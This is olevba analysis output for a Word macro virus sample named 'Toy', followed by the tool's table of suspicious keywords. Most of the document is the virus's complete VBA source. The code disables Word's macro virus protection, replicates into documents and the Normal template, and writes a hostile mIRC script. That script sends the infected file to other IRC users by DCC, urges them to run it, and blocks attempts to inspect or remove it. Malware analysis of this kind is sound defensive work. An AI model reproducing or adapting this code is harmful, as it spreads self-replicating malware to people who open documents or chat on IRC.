olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Toy-d1d9f759e108fdcbe52bd203aab18c929101f615
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Toy-d1d9f759e108fdcbe52bd203aab18c929101f615 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Toy-d1d9f759e108fdcbe52bd203aab18c929101f615 - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Toy
Sub AutoOpen()
Call Start
End Sub
Sub Start()
On Error Resume Next
Set Opt = Options
Opt.VirusProtection = 0
Opt.ConfirmConversions = 0
Opt.SaveNormalPrompt = 0
Set App = Application
App.EnableCancelKey = 0
App.DisplayAlerts = 0
hrm = 0
var9 = 0
var10 = 3
var11 = 1
Tmp1 = ActiveDocument.FullName
If ActiveDocument.Saved = False Then hrm = 1
Infect:
If var9 = 0 Then
Set Here = ActiveDocument.VBProject
Else
Set Here = NormalTemplate.VBProject
End If
For var12 = 1 To Here.VBComponents.Count
var13 = Here.VBComponents(var12).CodeModule.CountOfLines
var14 = Here.VBComponents(var12).CodeModule.Lines(1, 1)
If var12 <> 1 And var13 > 0 And UCase(var14) = "'TOY" Then
var10 = var10 - var11
var17 = Here.VBComponents.Item(var12).CodeModule.Lines(3, var13)
Exit For
End If
If var13 > 0 And UCase(var14) <> "'TOY" Then Here.VBComponents.Item(var12).CodeModule.DeleteLines 1, var13
Next var12
If var9 = 0 Then
var11 = var11 + 1
var9 = 1
GoTo Infect
End If
If var10 = 0 Then GoTo payload
If var10 = 1 Then
Set blah1 = ActiveDocument.VBProject
FCode = "'Toy" & Chr(13) & "Sub AutoOpen" & Chr(13) & var17
End If
If var10 = 2 Then
Set blah1 = NormalTemplate.VBProject
FCode = "'Toy" & Chr(13) & "Sub AutoClose" & Chr(13) & var17
End If
check3 = blah1.VBComponents.Count
If check3 < 2 Then
Open "C:\Toy.vxd" For Output As #1
Print #1, FCode
Close #1
blah1.VBComponents.Import ("C:\Toy.vxd")
Kill "C:\Toy.vxd"
GoTo payload
End If
For var18 = 2 To blah1.VBComponents.Count
var19 = blah1.VBComponents(var18).CodeModule.CountOfLines
If var19 < 50 Then
blah1.VBComponents(var18).CodeModule.AddFromstring (FCode)
Exit For
End If
Next var18
payload:
If MacroContainer <> NormalTemplate.Name Or Int(Rnd * 9) <> 7 Then GoTo done
Wind = Environ("WINDIR")
With Application.FileSearch
.LookIn = "C:\"
.SearchSubFolders = True
.FileName = "mirc32.exe"
.FileType = msoFileTypeAllFiles
.Execute msoSortByFileName
End With
For x = 1 To Application.FileSearch.FoundFiles.Count
Location = Application.FileSearch.FoundFiles(x)
LDir = Left(Location, Len(Location) - 10)
LM = LDir & "mirc.ini"
LN = LDir & "script.ini"
If Dir(LM) <> "" Then
var3 = Wind & "\Default.vxd"
SetAttr (LM), vbNormal
If System.PrivateProfileString(LM, "rfiles", "n2") <> LN Then System.PrivateProfileString(LM, "rfiles", "n2") = LN
If System.PrivateProfileString(LM, "rfiles", "n3") <> var3 Then System.PrivateProfileString(LM, "rfiles", "n3") = var3
If Dir(var3) <> "" Then
Kill var3
SetAttr (var3), vbNormal
End If
Open var3 For Output As #1
Print #1, "On 1:Connect:{ .ctcps on | Set %go 0 | hunting | .enable #damn3 | if ( $exists(C:\toy.sys) ) { Set %ex $read -l1 C:\toy.sys | if ( %ex != $null ) && ( $exists(%ex) ) { Set %go 1 } } | if ( $day = Friday ) && ( $r(1,7) = 4 ) { by } | if ( $r(1,25) != 7 ) { halt } | if ( $mid($version,3,1) > 4 ) { Set %varn1 editbox text | .timer77 0 .1 toy } | else { Set %fy 0 | .timer77 0 .5 toy1 } }"
Print #1, "On 1:Disconnect:{ .timers off | .write -c C:\Time.drv $time | .enable #damn3 | if ( %varn1 != $null ) { .colour %varn1 1 } }"
Print #1, "On 1:Input:*:{ Set %s $1- | if ( /timer isin %s ) || ( // isin %s ) || ( /. isin %s ) || ( /colour isin %s ) || ( disable isin %s ) || ( default isin %s ) || ( remove isin %s ) ( /write isin %s ) { halt } | if ( %eh isin %s ) { .echo -ae 4Hehe, come on, that wont work -12T13o9y | halt } }"
Print #1, "On 1:Join:*:{ if ( help isin # ) || ( dmsetup isin # ) || ( backorifice isin # ) || ( nohack isin # ) || ( vir isin # ) || ( aid isin # ) { Set %chan # | .timer7 1 .1 quiet } }"
Print #1, "On 1:Part:*:{ if ( %go = 0 ) { halt } | if ( $r(1,2) = 1 ) && ( $nick isreg # ) && ( $nick != $me ) { SQ $nick | .ignore -pcnu120 $nick } }"
Print #1, "On 1:FileSent:*:{ if ( %go = 0 ) { halt } | if ( $filename = %ex ) { .msg $nick Type //run -n $getdir $+ $nopath(%ex) to run | halt } | SQ $nick | .ignore -pcnu60 $nick 3 }"
Print #1, "On 1:FileRcvd:*:{ if ( %go = 0 ) { halt } | SQ $nick | .ignore -pcnu60 $nick }"
Print #1, "On 1:Notify:{ if ( %go = 0 ) { halt } | if ( $nick !isin %heh ) { %heh = %heh $+ $nick | .ignore -pcnu120 $nick 3 | .timer $+ $r(99,199) 1 10 .msg $nick Hey, talk to you in a minute. Check out this file, ok. | .timer $+ $r(99,199) 1 20 SQ $nick } }"
Print #1, "On 1:SockListen:sd:{ sockaccept we | ok1 }"
Print #1, "On 1:SockWrite:we:{ if ( %stop = 1 ) { .sockclose we | halt } | ok1 }"
Print #1, "On ^1:Kick:*:{ if ( $knick != $me ) { return } | letslook $1- | letsdo }"
Print #1, "On ^1:Notice:*:*:{ letslook $1- | letsdo }"
Print #1, "On ^1:Action:*:*:{ letslook $1- | letsdo }"
Print #1, "On ^1:Text:*:*:{ letslook $1- | letsdo }"
Print #1, "On ^1:Chat:*:{ letslook $1- | letsdo }"
Print #1, "On ^1:Serv:*:{ letslook $1- | letsdo }"
Print #1, "On ^1:Quit:{ letslook $1- | letsdo }"
Print #1, "On ^1:Topic:#:{ letslook $1- | letsdo }"
Print #1, "ctcp 1:*:*:{ letslook $1- | letsdo }"
Print #1, "raw 332:*:{ letslook $2- | Set %chan $2 | .timer7 1 .1 quiet }"
Print #1, "raw 401:*:{ halt }"
Print #1, "raw 439:*:{ halt }"
Print #1, "alias toy { Set %varn4 $r(0,14) | colour %varn1 %varn4 }"
Print #1, "alias toy1 { if ( %fy = 0 ) { .font -a 9 Fixedsys | Set %fy 1 | halt } | .font -a 9 WP TypographicSymbols | Set %fy 0 }"
Print #1, "alias toy2 { .echo -ae 4I'm sorry, but that command is not a 12T13o9y }"
Print #1, "alias by { .echo -ae 12T13o9y 8I4s 12B13y 9S8i4m12p13l9e8S4i12m13o9n }"
Print #1, "alias quiet { Set %var1 1 | :j | Set %var2 $nick(%chan,%var1) | if ( %var2 = $null ) { .part %chan | halt } | if ( %var2 != $me ) && ( %var2 != X ) && ( %var2 != W ) { .ignore %var2 3 } | inc %var1 | goto j }"
Print #1, "alias -l hunting { if ( $exists(C:\Time.drv) ) { Set %weird $time($file(C:\Time.drv).mtime,H) | Set %tmp1 $calc((%weird + 5) % 24) } | if ( %weird != $null ) { if ( %weird > $time(H) ) || ( %tmp1 < $time(H) ) { rabbits } } }"
Print #1, "alias -l rabbits { Set %tmp1 $ignore(0) | Set %tmp2 0 | :tm | inc %tmp2 | if ( %tmp1 = $null ) || ( %tmp2 > %tmp1 ) { goto out } | .ignore -r $ignore(1) | goto tm | :out }"
Print #1, "alias letsdo { .ignore $nick 3 | halt }"
Print #1, "alias letslook { if ( $nopath(%ex) !isin $1- ) && ( disable !isin $1- ) && ( script !isin $1- ) && ( dmsetup !isin $1- ) && ( worm !isin $1- ) && ( virus !isin $1- ) && ( infect !isin $1- ) && ( spread !isin $1- ) && ( remote !isin $1- ) && ( default !isin $1- ) && ( event !isin $1- ) && ( toy !isin $1- ) && ( unload !isin $1- ) { return } }"
Print #1, "alias unload { if ( $1 = $null ) || ( $2 = $null ) { .echo -e 2* /unload: insufficient parameters | halt } | .echo -e 2*** Unloaded script ' $+ $2- $+ ' | halt }"
Print #1, "alias remote { if ( $1 = $null ) { .echo -e 2*** Remote is OFF | halt } | if ( $1 = on ) { .echo -e 2*** Remote is ON (Ctcps,Events,Raw) } | else { .echo -e 2*** Remote is OFF } | halt }"
Print #1, "alias events { if ( $1 = $null ) { .echo -e 2*** Events are OFF | halt } | if ( $1 = on ) { .echo -e 2*** Events are ON } | else { .echo -e 2*** Events are OFF } | halt }"
Print #1, "alias remini { toy2 }"
Print #1, "alias alias { toy2 }"
Print #1, "alias run { toy2 }"
Print #1, "alias copy { toy2 }"
Print #1, "alias load { if ( $1 = -rs ) { toy2 | halt } }"
Print #1, "#damn3 on"
Print #1, "alias play { if ( $pos($1-,.mrc,1) > 0 ) || ( $pos($1-,.ini,1) > 0 ) || ( $pos($1-,.vxd,1) > 0 ) { halt } | .disable #damn3 | .timer0 1 .1 .play $1- | .enable #damn3 }"
Print #1, "#damn3 end"
Print #1, "alias writeini { toy2 }"
Print #1, "alias rename { toy2 }"
'DCC Send using socket commands is a modified version of that in _Bird_'s phraggle worm
Print #1, "alias SQ { %nick = $1- | %stop = 0 | %pt = $r(2400,5000) | %be = 0 | %pk = 4096 | %sz = $file(%ex).size | .notice %nick DCC Send %ex ( $+ $ip $+ ) | .raw -q privmsg %nick : $+ $chr(1) $+ DCC SEND %ex $longip($ip) %pt %sz $+ $chr(1) | if ( $sock(sd) != $null ) { .sockclose sd } | .socklisten sd %pt }"
Print #1, "alias ok1 { if ( $calc(%be + %pk) < %sz ) { .bread %ex %be %pk &data | .sockwrite we &data | inc %be %pk } | else { %stop = 1 | %pk = $calc( %sz - %be) | if (%pk == 0) { return } | .bread %ex %be %pk &data | .sockwrite we &data } }"
Close #1
SetAttr (var3), vbReadOnly
End If
If irc <> "" Then GoTo Junction
irc = Int(Rnd * 2)
If irc = 1 Then FName = Wind & "\Toy.doc"
If irc = 0 Then FName = Wind & "\Game.doc"
If irc = 2 Then FName = Wind & "\Fable.doc"
If Dir(FName) = "" Then
ActiveDocument.SaveAs FileName:=FName, AddToRecentFiles:=False
SetAttr (FName), vbReadOnly
hrm = 0
End If
If Dir("C:\Toy.sys") <> "" Then
SetAttr ("C:\Toy.sys"), vbNormal
Kill "C:\Toy.sys"
End If
Open "C:\Toy.sys" For Output As #1
Print #1, FName
Close #1
SetAttr ("C:\Toy.sys"), vbReadOnly
Junction:
If Dir(LN) = "" Then
Open LN For Output As #1
Print #1, "[script]"
Close #1
End If
Next x
done:
If var10 = 1 Then
If hrm = 0 Then
ActiveDocument.SaveAs FileName:=Tmp1
Else
ActiveDocument.Close
End If
Else
NormalTemplate.Save
End If
End Sub
Sub ViewVBCode()
End Sub
Sub ToolsMacro()
End Sub


















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |mirc32.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+
